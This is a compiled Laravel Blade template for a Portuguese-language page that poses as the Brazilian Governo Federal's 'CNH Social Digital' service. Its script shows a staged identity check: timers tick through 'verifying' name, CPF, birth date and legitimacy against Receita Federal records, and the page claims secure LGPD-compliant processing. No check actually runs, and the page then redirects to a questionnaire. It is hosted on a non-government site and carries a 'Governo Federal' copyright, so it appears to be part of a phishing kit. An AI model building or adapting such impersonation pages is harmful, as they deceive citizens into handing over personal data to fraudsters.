<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between">
                        <div>
                            <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B] mb-2">Validando seus dados</h1>
                        </div>
                    </div>
                    <p class="text-sm text-foreground leading-relaxed">Nossos sistemas oficiais irão analisar seus dados para confirmar se são válidos para o cadastro no programa.</p>
                    <div class="space-y-4">
                        <h2 class="text-lg font-bold text-govBlue text-center">Verificação em Progresso</h2>
                        <div class="flex items-center gap-2 text-sm font-medium">
                            <span>0%</span>
                            <div class="flex-1 h-2 bg-muted rounded-full overflow-hidden">
                                <div class="h-full bg-govBlue" id="progress-bar" style="transition: width 1s linear;width: 0%;"></div>
                            </div>
                            <span>100%</span>
                        </div>
                        <div class="space-y-3 mt-6">
                            <div class="flex items-start gap-3" id="step-1">
                                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-blue-100">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle h-5 w-5 text-govBlue animate-spin"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
                                </div>
                                <div class="flex-1">
                                    <p class="font-semibold text-govBlue">Verificando Nome completo</p>
                                    <p class="text-sm text-muted-foreground">Consultando cadastro nacional</p>
                                </div>
                            </div>
                            <div class="flex items-start gap-3" id="step-2">
                                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-muted">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock-icon lucide-clock h-5 w-5 text-gray-200"><path d="M12 6v6l4 2"/><circle cx="12" cy="12" r="10"/></svg>
                                </div>
                                <div class="flex-1">
                                    <p class="font-semibold text-muted-foreground">Verificando CPF</p>
                                    <p class="text-sm text-muted-foreground">Consultando bases da Receita Federal</p>
                                </div>
                            </div>
                            <div class="flex items-start gap-3" id="step-3">
                                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-muted">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock-icon lucide-clock h-5 w-5 text-gray-200"><path d="M12 6v6l4 2"/><circle cx="12" cy="12" r="10"/></svg>
                                </div>
                                <div class="flex-1">
                                    <p class="font-semibold text-muted-foreground">Validando Data de Nascimento</p>
                                    <p class="text-sm text-muted-foreground">Comparação com registros oficiais</p>
                                </div>
                            </div>
                            <div class="flex items-start gap-3" id="step-4">
                                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-muted">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock-icon lucide-clock h-5 w-5 text-gray-200"><path d="M12 6v6l4 2"/><circle cx="12" cy="12" r="10"/></svg>
                                </div>
                                <div class="flex-1">
                                    <p class="font-semibold text-muted-foreground">Verificando legitimidade</p>
                                    <p class="text-sm text-muted-foreground">Análise de documentação</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="border-l-4 border-green-600 bg-green-50 p-4 rounded space-y-2 mt-6">
                        <div class="flex items-start gap-3">
                            <div class="bg-green-100 rounded-full p-2">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                            </div>
                            <div>
                                <h3 class="text-base font-bold text-foreground">Sistema de Verificação Segura</h3>
                                <p class="text-sm text-muted-foreground mt-1">A verificação de identidade é realizada utilizando conexão criptografada e todos os seus dados são processados com os mais altos padrões de segurança em conformidade com a Lei Geral de Proteção de Dados (LGPD).</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.text-gray-200{color:oklch(70.7% 0.022 261.325);}
</style>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
    const userData = JSON.parse(sessionStorage.getItem("userData"));
    if(!userData){
        window.location.href = "<?php echo e(url('/login')); ?>";
    }

    $('#progress-bar').animate({ width: '100%' }, 8000);

    setTimeout(() => {
        $('#step-1').html(`
            <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-green-100">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
            </div>
            <div class="flex-1">
                <p class="font-semibold text-green-600">Verificando Nome completo</p>
                <p class="text-sm text-muted-foreground">Consultando cadastro nacional</p>
            </div>
        `);
        $('#step-2').html(`
            <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-blue-100">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle h-5 w-5 text-govBlue animate-spin"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
            </div>
            <div class="flex-1">
                <p class="font-semibold text-govBlue">Verificando CPF</p>
                <p class="text-sm text-muted-foreground">Consultando bases da Receita Federal</p>
            </div>
        `);

        setTimeout(() => {
            $('#step-2').html(`
                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-green-100">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                </div>
                <div class="flex-1">
                    <p class="font-semibold text-green-600">Verificando CPF</p>
                    <p class="text-sm text-muted-foreground">Consultando bases da Receita Federal</p>
                </div>
            `);
            $('#step-3').html(`
                <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-blue-100">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle h-5 w-5 text-govBlue animate-spin"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
                </div>
                <div class="flex-1">
                    <p class="font-semibold text-govBlue">Validando Data de Nascimento</p>
                    <p class="text-sm text-muted-foreground">Comparação com registros oficiais</p>
                </div>
            `);

            setTimeout(() => {
                $('#step-3').html(`
                    <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-green-100">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                    </div>
                    <div class="flex-1">
                        <p class="font-semibold text-green-600">Validando Data de Nascimento</p>
                        <p class="text-sm text-muted-foreground">Comparação com registros oficiais</p>
                    </div>
                `);
                $('#step-4').html(`
                    <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-blue-100">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle h-5 w-5 text-govBlue animate-spin"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
                    </div>
                    <div class="flex-1">
                        <p class="font-semibold text-govBlue">Verificando legitimidade</p>
                        <p class="text-sm text-muted-foreground">Análise de documentação</p>
                    </div>
                `);

                setTimeout(() => {
                    $('#step-4').html(`
                        <div class="mt-1 rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 bg-green-100">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                        </div>
                        <div class="flex-1">
                            <p class="font-semibold text-green-600">Verificando legitimidade</p>
                            <p class="text-sm text-muted-foreground">Análise de documentação</p>
                        </div>
                    `);
                    setTimeout(() => {
                        window.location.href = "<?php echo e(url('/questionario')); ?>";
                    }, 500);
                }, 2000);
            }, 2000);
        }, 2000);
    }, 2000);
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/validacao.blade.php ENDPATH**/ ?>